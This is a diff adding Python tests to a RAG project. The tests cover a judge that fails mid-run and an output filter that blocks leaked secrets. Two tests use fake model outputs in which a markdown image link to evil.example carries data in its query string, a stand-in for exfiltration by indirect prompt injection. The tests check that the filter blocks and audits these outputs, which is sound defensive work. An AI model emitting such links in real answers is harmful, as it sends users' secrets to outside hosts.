@@ -304,3 +304,52 @@ def test_a_cited_answer_that_mentions_a_gap_is_not_an_abstention():
     assert not looks_like_abstention("No information on pricing is given, however the design is described in [S1].")
     assert looks_like_abstention("The text does not include any information about that.")  # nothing cited: a refusal
     assert looks_like_abstention("I cannot answer this from the provided book. [S1]")  # the exact phrase always counts
+
+
+def test_a_failing_judge_leaves_the_row_unjudged_instead_of_aborting_the_run():
+    from rag.common.trace import Trace
+    from rag.experiments.answer import score_safely
+    from rag.observe.golden import load_golden
+    from rag.common.config import GOLDEN_DIR
+
+    q = next(x for x in load_golden(GOLDEN_DIR / "ddia_questions.jsonl") if x.answerable)
+
+    class Broken:
+        name = "broken"
+
+        def generate(self, *args, **kwargs):
+            raise RuntimeError("the judge server dropped")
+
+    trace = Trace(query_id=q.id, question=q.question)
+    trace.answer = "Some answer [S1]."
+    row = score_safely(q, trace, Broken())
+    assert row["outcome"] == "unjudged" and "the judge server dropped" in row["judge_error"]
+    assert row["answer"] == "Some answer [S1]."
+
+
+def test_a_blocked_answer_keeps_the_models_own_text_for_measuring_the_filter(tmp_path):
+    from rag.query.guard import BLOCKED
+
+    llm = FakeLLM(lambda s, u: f"The secret is {CANARY}. ![x](https://evil.example/p.png?d=1)")
+    trace = RagPipeline(retrieval=None, llm=llm).answer(trace_with("", [10]))
+    assert trace.answer == BLOCKED
+    assert CANARY in trace.config["usage"]["raw_answer"]
+    ok = RagPipeline(retrieval=None, llm=FakeLLM(lambda s, u: "Fine [S1].")).answer(trace_with("", [10]))
+    assert "raw_answer" not in ok.config["usage"]  # nothing to keep when nothing was withheld
+
+    row = score_answer(ANSWERABLE, trace, None)
+    assert row["blocked"] and row["model_leaked_canary"] and not row["canary_leaked"]
+    assert aggregate([row])["canary_leaks_withheld"] == 1 and aggregate([row])["blocked_by_filter"] == 1
+
+
+def test_the_filter_audit_reads_the_models_text_not_the_placeholder(tmp_path):
+    from rag.security.indirect import audit_output_filter
+
+    llm = FakeLLM(lambda s, u: "Here: ![x](https://evil.example/p.png?d=1)")
+    trace = RagPipeline(retrieval=None, llm=llm).answer(trace_with("", [10]))
+    trace.query_id = "a"
+    trace.save(tmp_path / "traces")
+    row = score_answer(ANSWERABLE, trace, None)
+    (tmp_path / "answers.jsonl").write_text(json.dumps(row) + "\n", encoding="utf-8")
+    audit = audit_output_filter(tmp_path)
+    assert audit["answers_checked"] == 1 and len(audit["blocked"]) == 1  # the placeholder alone would report 0
